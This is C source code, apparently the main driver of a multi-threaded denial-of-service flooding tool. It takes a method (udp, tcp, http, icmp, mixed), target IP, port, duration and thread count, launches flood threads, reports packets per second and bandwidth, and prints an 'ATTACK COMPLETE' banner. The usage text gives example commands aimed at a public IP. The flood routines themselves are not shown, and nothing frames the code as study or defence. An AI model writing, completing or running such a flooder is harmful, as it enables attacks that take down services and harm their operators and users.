void usage(char *prog) {
    banner();
    printf("\nUsage: %s <METHOD> <IP> <PORT> <TIME> <THREADS>\n\n", prog);
    printf("METHODS: udp, tcp, http, icmp, mixed\n");
    printf("EXAMPLES:\n");
    printf("  %s udp 1.1.1.1 443 60 2000\n", prog);
    printf("  %s tcp 1.1.1.1 80 120 1000\n", prog);
    printf("  sudo %s icmp 1.1.1.1 0 60 1000\n", prog);
    exit(1);
}

int main(int argc, char *argv[]) {
    signal(SIGINT, signal_handler);
    signal(SIGTERM, signal_handler);
    srand(time(NULL) ^ getpid());
    
    if (argc < 6) usage(argv[0]);
    
    char *method = argv[1];
    char *ip = argv[2];
    int port = atoi(argv[3]);
    int duration = atoi(argv[4]);
    int threads = atoi(argv[5]);
    
    if (duration <= 0 || duration > 600) duration = 60;
    if (threads < 1 || threads > MAX_THREADS) threads = 2000;
    if (strcmp(method, "icmp") != 0 && (port < 1 || port > 65535)) port = 443;
    
    banner();
    printf("\n[CONFIG] Method: %s | Target: %s:%d | Duration: %ds | Threads: %d\n\n",
           method, ip, port, duration, threads);
    
    // Setup UDP socket if needed
    if (strcmp(method, "udp") == 0 || strcmp(method, "mixed") == 0) {
        global_sock = socket(AF_INET, SOCK_DGRAM, 0);
        if (global_sock < 0) { perror("UDP socket"); exit(1); }
        int opt = 1, buf_size = SOCKET_BUFFER_SIZE;
        setsockopt(global_sock, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));
        setsockopt(global_sock, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        memset(&global_dest, 0, sizeof(global_dest));
        global_dest.sin_family = AF_INET;
        global_dest.sin_port = htons(port);
        global_dest.sin_addr.s_addr = inet_addr(ip);
    }
    
    // Select thread function
    void *(*thread_func)(void *) = NULL;
    if (strcmp(method, "udp") == 0) thread_func = udp_thread;
    else if (strcmp(method, "tcp") == 0) thread_func = tcp_thread;
    else if (strcmp(method, "http") == 0) thread_func = http_thread;
    else if (strcmp(method, "icmp") == 0) thread_func = icmp_thread;
    else if (strcmp(method, "mixed") == 0) thread_func = mixed_thread;
    else { printf("Invalid method. Using UDP.\n"); thread_func = udp_thread; }
    
    pthread_t tids[threads];
    for (int i = 0; i < threads; i++) {
        char *arg = malloc(256);
        strcpy(arg, ip);
        memcpy(arg + 64, &port, sizeof(int));
        memcpy(arg + 128, &i, sizeof(int));
        if (pthread_create(&tids[i], NULL, thread_func, (void *)(long)i) != 0) {
            fprintf(stderr, "Failed to create thread %d\n", i);
            threads = i;
            break;
        }
    }
    
    time_t start = time(NULL);
    unsigned long long last_sent = 0;
    while (running && (time(NULL) - start) < duration) {
        int elapsed = time(NULL) - start;
        int remaining = duration - elapsed;
        unsigned long long current = total_sent;
        unsigned long long rate = current - last_sent;
        double mbps = (total_bytes / (1024.0 * 1024.0)) / (elapsed + 1);
        printf("\r[%3d/%3d] Sent: %10llu | Rate: %6llu pps | %.2f MB/s | Left: %3ds",
               elapsed, duration, current, rate, mbps, remaining);
        fflush(stdout);
        last_sent = current;
        sleep(1);
    }
    
    running = 0;
    printf("\n\n⏳ Waiting for threads to finish...\n");
    for (int i = 0; i < threads; i++) pthread_join(tids[i], NULL);
    if (global_sock > 0) close(global_sock);
    
    int elapsed = time(NULL) - start;
    printf("\n╔══════════════════════════════════════════════════════════════════╗\n");
    printf("║                      ✅ ATTACK COMPLETE ✅                        ║\n");
    printf("╠══════════════════════════════════════════════════════════════════╣\n");
    printf("║  Total Sent: %-20llu                                      ║\n", total_sent);
    printf("║  Total Data: %-20llu MB                                   ║\n", total_bytes/(1024*1024));
    printf("║  Duration:   %d seconds\n", elapsed);
    printf("║  Avg Rate:   %llu pps\n", elapsed > 0 ? total_sent/elapsed : 0);
    printf("║  Avg Bandwidth: %.2f MB/s\n", (total_bytes/(1024.0*1024.0))/(elapsed+1));
    printf("╚══════════════════════════════════════════════════════════════════╝\n\n");
    return 0;
}